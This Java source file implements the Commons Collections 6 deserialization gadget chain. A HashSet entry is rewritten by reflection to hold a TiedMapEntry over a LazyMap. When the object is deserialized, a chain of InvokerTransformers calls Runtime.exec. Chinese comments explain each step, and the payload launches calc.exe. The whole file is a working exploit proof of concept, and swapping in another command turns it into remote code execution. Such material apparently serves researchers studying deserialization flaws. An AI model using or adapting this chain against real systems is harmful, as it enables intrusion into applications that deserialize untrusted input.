import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/*
	Gadget chain:
	    java.io.ObjectInputStream.readObject()
            java.util.HashSet.readObject()
                java.util.HashMap.put()
                java.util.HashMap.hash()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                        org.apache.commons.collections.map.LazyMap.get()
                            org.apache.commons.collections.functors.ChainedTransformer.transform()
                            org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                                java.lang.Runtime.exec()
*/

public class HashSetCC6 {
    public static void main(String[] args) throws Exception{

        Transformer[] transformers = {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc.exe"}),
                new ConstantTransformer(1),
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //创建HashSet对象用于序列化，往map->table->node->key添加一个数据”hacker“。
        HashSet hashSet = new HashSet(1);
        hashSet.add("hacker");

        //创建LazyMap对象和TiedMapEntry对象，将TiedMapEntry对象的map属性值设置为LazyMap对象
        HashMap innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, chainedTransformer);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");


        //取出HashSet的map的table的node，node对象存储了哈希表中单个元素的数据。为什么不直接创建一个node对象？因为Node类是HashMap的静态内部类且访问权限为package-private。
        HashMap map = (HashMap) Util.getObjectFieldValue(hashSet, "map");
        Object[] table = (Object[]) Util.getObjectFieldValue(map, "table");
        Object node = table[0];
        if (node == null) {
            node = table[1];
        }

        //将node对象的key修改为TiedMapEntry对象，这里实际上就是将“hacker”修改“TiedMapEntry对象”。
        Util.setValue(node, "key", entry);

        byte[] bytes = Util.toSerial(hashSet);
        Util.fromSerial(bytes).readObject();
    }
}
